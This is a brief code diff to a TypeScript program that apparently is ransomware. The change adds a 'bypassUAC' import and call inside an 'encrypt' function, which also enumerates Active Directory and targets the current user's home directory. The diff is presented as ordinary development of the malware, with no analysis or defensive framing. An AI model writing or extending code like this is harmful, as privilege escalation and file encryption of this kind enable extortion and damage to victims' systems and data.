@@ -6,9 +6,11 @@ import config from './config.json';
 import https from 'https';
 import createRandomString from './utils/generateRandomString';
 import enumerateAD from './enumerateAd';
+import bypassUAC from './UACBypass';
 
 const encrypt = () => {
   enumerateAD();
+  bypassUAC();
   const userName: string = os.userInfo().username;
   const userDir: string = `C:\\Users\\${userName}`;
   console.log('Starting...\n');
